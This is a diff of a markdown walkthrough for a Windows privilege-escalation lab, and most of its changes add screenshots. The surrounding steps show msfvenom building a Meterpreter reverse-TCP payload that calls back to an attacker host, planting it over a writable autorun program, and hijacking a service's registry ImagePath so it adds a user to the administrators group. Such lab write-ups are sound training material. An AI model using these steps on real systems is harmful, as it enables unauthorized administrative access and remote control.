@@ -19,7 +19,7 @@
 >[!warning]
 > ### Connect To Target
 > ```ruby
-> xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.103.25
+> xfreerdp3 /u:user /p:password321 /v:10.10.71.148 /cert:ignore /sec:rdp
 > ```
 > **`Or`**
 >
@@ -76,7 +76,10 @@
       C:\Program Files\Autorun Program\program.exe
   
       ```
-  
+
+      <img width="819" height="209" alt="image" src="https://github.com/user-attachments/assets/08b8581f-0b3a-4cc6-9c0a-8986e8ad13da" />
+
+
   4.  Check File Permissions
   
       Return to the command prompt and use accesschk64.exe to check the permissions on the program's directory.
@@ -87,7 +90,10 @@
       C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
   
       ```
-  
+
+      <img width="647" height="263" alt="image" src="https://github.com/user-attachments/assets/d20be315-7309-4288-9cb4-ec06353ce661" />
+
+
   5.  Confirm the Vulnerability
   
       The output will show that the Everyone user group has ``FILE_ALL_ACCESS`` permission. This is the vulnerability, as it means any user can modify or replace the program.exe file.
@@ -122,7 +128,8 @@
       msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
   
       ```
-  
+
+
   3.  Start the Listener
   
       The listener will now wait for a connection.
@@ -133,6 +140,9 @@
       msf6 exploit(multi/handler) > run
   
       ```
+
+      <img width="863" height="492" alt="image" src="https://github.com/user-attachments/assets/d70396ea-063a-465c-99a1-8d1fa4efc54e" />
+
   
   4.  Generate the Malicious Payload
   
@@ -144,11 +154,17 @@
       msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f exe -o program.exe
   
       ```
+
+     <img width="929" height="337" alt="image" src="https://github.com/user-attachments/assets/d4d93941-457d-46a8-8a3f-07f1eca288fe" />
+
   
   5.  Transfer the Payload
   
       Copy the newly generated program.exe file from your Kali VM to the Windows VM's desktop.
-  
+
+      <img width="1543" height="609" alt="image" src="https://github.com/user-attachments/assets/5daebdf6-0778-4aca-8596-96e866c26c38" />
+
+
   ### 2\. Planting the Payload (Windows VM)
   
   1.  On the Windows VM, replace the original program with your malicious payload. You can do this via the command line or file explorer:
@@ -410,7 +426,11 @@
       Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
   
       ```
-  
+
+     <img width="994" height="270" alt="image" src="https://github.com/user-attachments/assets/5f376f33-75df-4868-a440-f9afb2c52cb2" />
+
+
+
   2.  Identify the Vulnerability
   
       In the output, examine the Access list. Notice that the NT AUTHORITY\INTERACTIVE group has FullControl permission. This is the vulnerability. The INTERACTIVE group includes any user who is logged on locally, meaning our low-privileged user can modify this key.
@@ -427,7 +447,10 @@
   1.  Transfer the Source Code
   
       First, copy the source file windows_service.c from the Windows VM (C:\Users\User\Desktop\Tools\Source\) to your Kali VM.
-  
+
+      <img width="1305" height="253" alt="image" src="https://github.com/user-attachments/assets/e000b2bd-8f58-4ec3-8a64-befdd41c2085" />
+
+     
   2.  Modify the Payload Command
   
       Open windows_service.c on Kali with a text editor. Find the line containing the system() function and change its command to the following, which will add a user named user to the local administrators group.
@@ -438,6 +461,10 @@
       system("cmd.exe /k net localgroup administrators user /add");
   
       ```
+
+      <img width="703" height="576" alt="image" src="https://github.com/user-attachments/assets/4d1f4a4e-f154-4199-8c1f-f6c9fd99019d" />
+
+
   
   3.  Cross-Compile the Executable
   
@@ -449,11 +476,17 @@
       x86_64-w64-mingw32-gcc windows_service.c -o x.exe
   
       ```
+
+     <img width="587" height="200" alt="image" src="https://github.com/user-attachments/assets/eca01cdf-f18e-49e8-a426-b577106694fd" />
+
   
   4.  Transfer the Payload Back
   
       Copy the newly compiled payload, x.exe, from your Kali VM to a writable directory on the Windows VM, such as C:\Temp.
-  
+
+     <img width="513" height="113" alt="image" src="https://github.com/user-attachments/assets/a54a9283-0bd5-400e-a9ec-651a72a6c76c" />
+
+
   ### 2\. Modifying and Triggering the Service (Windows VM)
   
   Now, we will reconfigure the service to point to our new executable and then start it.
@@ -468,7 +501,10 @@
       reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
   
       ```
-  
+
+     <img width="648" height="127" alt="image" src="https://github.com/user-attachments/assets/8a2610a0-b3df-448f-bbea-8bf1eabcd0d6" />
+
+
   2.  Start the Service to Trigger the Exploit
   
       Now, start the service. Windows will execute c:\temp\x.exe with the service's LocalSystem privileges.
@@ -479,7 +515,10 @@
       sc start regsvc
   
       ```
-  
+
+     <img width="659" height="166" alt="image" src="https://github.com/user-attachments/assets/f523d731-d60c-4996-8164-7b6f566e29c9" />
+
+   
       The command in our payload will now execute, adding the `user` to the administrators group.
   
   ✅ Verification
@@ -501,11 +540,14 @@
       You will now see the `user` account listed as a member, confirming that you have successfully escalated privileges.
   
   
+      **`before`**
+
+     <img width="651" height="166" alt="image" src="https://github.com/user-attachments/assets/095264d1-ad26-478e-b106-7b2e2e013f15" />
 
 
+     **`after`**
 
-
-
+     <img width="652" height="213" alt="image" src="https://github.com/user-attachments/assets/328a56ef-cd33-412a-94d0-c49ce3b4e6fe" />
 
 
 
